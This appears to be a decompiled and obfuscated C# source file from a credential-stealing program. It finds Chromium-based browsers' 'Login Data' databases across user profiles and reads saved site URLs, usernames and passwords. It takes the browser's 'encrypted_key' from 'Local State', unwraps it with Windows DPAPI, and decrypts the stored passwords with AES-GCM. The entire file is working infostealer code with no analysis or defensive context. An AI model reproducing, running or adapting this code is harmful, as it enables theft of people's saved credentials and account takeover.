using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using _81d;
using SNt;
using p3N5Y;

namespace TMiOl;

internal sealed class _0OgNv
{
	internal static List<ii68> tL4OBK(string lNicdPOEzh, string D2kqyEcTZpY, string dIGlOE6X = "logins")
	{
		int num = 0;
		List<string> list = default;
		string[] array = default;
		List<ii68> list2 = default;
		string text = default;
		int num2 = default;
		while (true)
		{
			if (num == 5)
			{
				goto IL_0361;
			}
			if (num == 1)
			{
				list = L04Pb(lNicdPOEzh);
				num = 2;
			}
			if (num == 3)
			{
				array = list.ToArray();
				num = 4;
			}
			if (num == 2)
			{
				list2 = new List<ii68>();
				num = 3;
			}
			if (num == 7)
			{
				if (!File.Exists(text))
				{
					goto IL_0353;
				}
				num = 8;
			}
			if (num == 6)
			{
				goto IL_00d7;
			}
			goto IL_00ed;
			IL_0353:
			num2++;
			goto IL_0361;
			IL_00d7:
			text = array[num2];
			num = 7;
			goto IL_00ed;
			IL_00ed:
			if (num == 4)
			{
				num2 = 0;
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 8)
			{
				continue;
			}
			_5bBC obj;
			try
			{
				obj = new _5bBC(text);
			}
			catch
			{
				goto IL_0353;
			}
			if (obj.ga9(dIGlOE6X))
			{
				string empty = string.Empty;
				string empty2 = string.Empty;
				string empty3 = string.Empty;
				for (int i = 0; i <= obj.FtN5geM() - 1; i++)
				{
					try
					{
						empty = obj.Jw0(i, "origin_url");
						empty2 = obj.Jw0(i, "username_value");
						empty3 = obj.Jw0(i, "password_value");
						if (empty3.StartsWith("v10") | empty3.StartsWith("v11"))
						{
							byte[] array2 = new byte[0];
							array2 = ((!(text.Contains("Opera Stable") & Directory.Exists(Directory.GetParent(text).FullName))) ? KC1Z(Directory.GetParent(text).Parent.FullName) : KC1Z(Directory.GetParent(text).FullName));
							empty3 = NzCWzvruJM(Encoding.Default.GetBytes(obj.Jw0(i, "password_value")), array2);
						}
						else
						{
							empty3 = NLU3vLrG(obj.Jw0(i, "password_value"));
						}
						if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
						{
							list2.Add(new ii68
							{
								byIdLuuGZbL = empty,
								S8v = empty2,
								_9H5rP7hg2 = empty3,
								oVAe = D2kqyEcTZpY
							});
						}
					}
					catch
					{
					}
				}
			}
			goto IL_0353;
			IL_0361:
			if (num2 >= array.Length)
			{
				break;
			}
			goto IL_00d7;
		}
		return list2;
	}

	public static byte[] KC1Z(string m47L1wZS)
	{
		int num = 0;
		byte[] array = default;
		string path = default;
		while (true)
		{
			if (num == 2)
			{
				array = new byte[0];
				num = 3;
			}
			if (num == 1)
			{
				path = m47L1wZS + "\\Local State";
				num = 2;
			}
			if (num != 5)
			{
				if (num == 4)
				{
					return null;
				}
				if (num == 3)
				{
					if (File.Exists(path))
					{
						goto IL_0073;
					}
					num = 4;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					break;
				}
				continue;
			}
			goto IL_0073;
			IL_0073:
			MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path));
			foreach (Match item in matchCollection)
			{
				if (item.Success)
				{
					try
					{
						array = Convert.FromBase64String(item.Groups[1].Value);
					}
					catch
					{
						return null;
					}
				}
			}
			if ((array != null) & (array.Length > 5))
			{
				byte[] array2 = new byte[array.Length - 6 + 1];
				Array.Copy(array, 5, array2, 0, array.Length - 5);
				try
				{
					return ctLlKJA7.c7mw(array2, (DataProtectionScope)0);
				}
				catch
				{
					return null;
				}
			}
			return null;
		}
		byte[] result = default;
		return result;
	}

	public static string NzCWzvruJM(byte[] FUXn9A2K, byte[] _30tQNciWOx)
	{
		int num = 0;
		byte[] array = default;
		byte[] array2 = default;
		do
		{
			if (num == 1)
			{
				array = new byte[12];
				num = 2;
			}
			if (num == 2)
			{
				array2 = array;
				num = 3;
			}
			if (num == 3)
			{
				Array.Copy(FUXn9A2K, 3, array2, 0, 12);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			byte[] array3 = new byte[FUXn9A2K.Length - 15];
			Array.Copy(FUXn9A2K, 15, array3, 0, FUXn9A2K.Length - 15);
			Tfbu6 tfbu = new Tfbu6();
			byte[] array4 = new byte[16];
			byte[] array5 = new byte[array3.Length - array4.Length];
			Array.Copy(array3, array3.Length - 16, array4, 0, 16);
			Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
			return Encoding.UTF8.GetString(tfbu.lcjRODFxX8p(_30tQNciWOx, array2, null, array5, array4));
		}
		catch
		{
			return null;
		}
	}

	public static string NLU3vLrG(string ZZ2ozgRh)
	{
		int num = 0;
		while (true)
		{
			if (num != 3)
			{
				if (num == 1)
				{
					if (ZZ2ozgRh == null)
					{
						goto IL_001f;
					}
					num = 2;
				}
				if (num == 2)
				{
					if (ZZ2ozgRh.Length != 0)
					{
						break;
					}
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 4)
				{
					break;
				}
				continue;
			}
			goto IL_001f;
			IL_001f:
			return null;
		}
		try
		{
			return ctLlKJA7.Lbl(Encoding.Default.GetBytes(ZZ2ozgRh), (DataProtectionScope)0);
		}
		catch
		{
			return null;
		}
	}

	public static List<string> L04Pb(string WGvJXNVgWkW)
	{
		int num = 0;
		int num2 = default;
		string[] directories = default;
		List<string> list = default;
		List<string> list2 = default;
		string text = default;
		while (true)
		{
			if (num == 5)
			{
				if (!Directory.Exists(WGvJXNVgWkW))
				{
					goto IL_0111;
				}
				num = 6;
			}
			if (num == 9)
			{
				goto IL_0047;
			}
			goto IL_005d;
			IL_0131:
			if (num2 < directories.Length)
			{
				goto IL_0047;
			}
			num = 14;
			goto IL_0149;
			IL_0095:
			num2++;
			num = 13;
			goto IL_00ac;
			IL_0149:
			if (num == 4)
			{
				list = list2;
				num = 5;
			}
			if (num == 8)
			{
				goto IL_0131;
			}
			if (num == 14)
			{
				break;
			}
			if (num == 1)
			{
				list2 = new List<string>();
				num = 2;
			}
			if (num == 3)
			{
				list2.Add(WGvJXNVgWkW + "\\Login Data");
				num = 4;
			}
			if (num == 2)
			{
				list2.Add(WGvJXNVgWkW + "\\Default\\Login Data");
				num = 3;
			}
			if (num == 10)
			{
				if (!text.Contains("Profile"))
				{
					goto IL_0095;
				}
				num = 11;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 16)
			{
				break;
			}
			continue;
			IL_005d:
			if (num == 6)
			{
				directories = Directory.GetDirectories(WGvJXNVgWkW);
				num = 7;
			}
			if (num == 12)
			{
				goto IL_0095;
			}
			goto IL_00ac;
			IL_0111:
			return new List<string>();
			IL_0047:
			text = directories[num2];
			num = 10;
			goto IL_005d;
			IL_00ac:
			if (num == 7)
			{
				num2 = 0;
				num = 8;
			}
			if (num == 11)
			{
				list.Add(text + "\\Login Data");
				num = 12;
			}
			if (num == 15)
			{
				goto IL_0111;
			}
			if (num == 13)
			{
				goto IL_0131;
			}
			goto IL_0149;
		}
		return list;
	}
}
